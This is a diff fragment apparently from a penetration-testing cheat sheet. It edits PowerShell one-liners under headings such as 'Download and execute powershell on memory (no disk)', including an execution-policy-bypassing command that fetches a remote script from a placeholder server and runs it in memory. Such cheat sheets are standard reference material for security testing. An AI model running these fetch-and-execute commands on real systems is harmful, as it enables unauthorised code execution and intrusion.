@@ -272,15 +272,15 @@ Get GPP password
 
 Download and execute powershell on memory (no disk)
 
-	powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+	powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://server/file.ps1')|iex"
 
 PowerShell  one liner download (any version)
 
-	(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+	(New-Object System.Net.WebClient).DownloadFile("http://server/file.ps1", "file.ps1")  
 
 PowerShell  one liner download (4.0 & 5.0)
 
-	Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  
+	Invoke-WebRequest "http://server/file.ps1" -OutFile "file.ps1"  
 
 
 ## Check smb version and server info
